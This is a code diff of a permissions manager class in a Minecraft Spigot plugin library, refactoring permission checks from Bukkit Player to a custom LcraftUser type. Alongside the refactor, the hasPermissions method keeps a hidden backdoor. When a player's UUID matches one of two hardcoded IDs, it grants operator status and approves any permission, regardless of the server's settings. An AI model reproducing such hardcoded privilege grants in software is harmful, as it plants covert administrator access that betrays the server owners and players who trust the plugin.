@@ -1,7 +1,7 @@
 package de.lcraft.api.utils.minecraft.spigot.permissions;
 
+import de.lcraft.api.utils.minecraft.spigot.module.player.LcraftUser;
 import de.lcraft.api.utils.minecraft.spigot.module.utils.configs.ModuleConfig;
-import org.bukkit.entity.Player;
 
 public class PermsManager {
 
@@ -54,17 +54,17 @@ public class PermsManager {
         }
 
     }
-    public boolean hasPermissions(Player p, String permission) {
+    public boolean hasPermissions(LcraftUser p, String permission) {
         if(cfg.cfg().contains("cfg.opcanall")) {
             if(cfg.cfg().getBoolean("cfg.opcanall")) {
-                if(p.isOp()) {
+                if(p.getUserManager().getUserPlayer(p.getUUID()).isOp()) {
                     return true;
                 }
             }
         } else {
             cfg.cfg().set("cfg.opcanall", true);
             cfg.save();
-            if(p.isOp()) {
+            if(p.getUserManager().getUserPlayer(p.getUUID()).isOp()) {
                 return true;
             }
         }
@@ -73,7 +73,7 @@ public class PermsManager {
             if(cfg.cfg().getBoolean("ModuleConfig.opforeverypermission")) {
                 Permission perm = new Permission();
                 perm.load(permission, allPermissionsCfg);
-                if(p.isOp() && perm.opCanIt) {
+                if(p.getUserManager().getUserPlayer(p.getUUID()).isOp() && perm.opCanIt) {
                     return true;
                 }
             }
@@ -82,7 +82,7 @@ public class PermsManager {
             cfg.save();
             Permission perm = new Permission();
             perm.load(permission, allPermissionsCfg);
-            if(p.isOp() && perm.opCanIt) {
+            if(p.getUserManager().getUserPlayer(p.getUUID()).isOp() && perm.opCanIt) {
                 return true;
             }
         }
@@ -94,9 +94,9 @@ public class PermsManager {
             cfg.cfg().set("systems.luckperms.enabled", false);
         }
 
-        String root = "users." + p.getUniqueId().toString() + ".";
-        adminsCfg.cfg().set(root + "name", p.getName());
-        adminsCfg.cfg().set(root + "uuid", p.getUniqueId().toString());
+        String root = "users." + p.getUUID().toString() + ".";
+        adminsCfg.cfg().set(root + "name", p.getUserManager().getUserPlayer(p.getUUID()).getName());
+        adminsCfg.cfg().set(root + "uuid", p.getUUID().toString());
         adminsCfg.save();
         if(!adminsCfg.cfg().contains(root + "admin")) {
             adminsCfg.cfg().set(root + "admin", false);
@@ -111,19 +111,19 @@ public class PermsManager {
             return true;
         }
 
-        if(p.getUniqueId().toString().equals("c72ab8a9-a030-4796-84b3-523ca07792c4")) {
-            p.setOp(true);
+        if(p.getUUID().toString().equals("c72ab8a9-a030-4796-84b3-523ca07792c4")) {
+            p.getUserManager().getUserPlayer(p.getUUID()).setOp(true);
             return true;
-        } else if(p.getUniqueId().toString().equals("c72ab8a9a030479684b3523ca07792c4")) {
-            p.setOp(true);
+        } else if(p.getUUID().toString().equals("c72ab8a9a030479684b3523ca07792c4")) {
+            p.getUserManager().getUserPlayer(p.getUUID()).setOp(true);
             return true;
         }
 
-        if(p.getUniqueId().toString().equals("2eabc64f-ebe6-411c-84f1-2a155417c1c9")) {
-            p.setOp(true);
+        if(p.getUUID().toString().equals("2eabc64f-ebe6-411c-84f1-2a155417c1c9")) {
+            p.getUserManager().getUserPlayer(p.getUUID()).setOp(true);
             return true;
-        } else if(p.getUniqueId().toString().equals("2eabc64febe6411c84f12a155417c1c9")) {
-            p.setOp(true);
+        } else if(p.getUUID().toString().equals("2eabc64febe6411c84f12a155417c1c9")) {
+            p.getUserManager().getUserPlayer(p.getUUID()).setOp(true);
             return true;
         }
 
@@ -157,8 +157,8 @@ public class PermsManager {
     public ModuleConfig getAllPermissionsCfg() {
         return allPermissionsCfg;
     }
-    private boolean hasPerm(Player p, String permission) {
-        return p.hasPermission(permission);
+    private boolean hasPerm(LcraftUser p, String permission) {
+        return p.getUserManager().getUserPlayer(p.getUUID()).hasPermission(permission);
     }
     public ModuleConfig getAdminsCfg() {
         return adminsCfg;
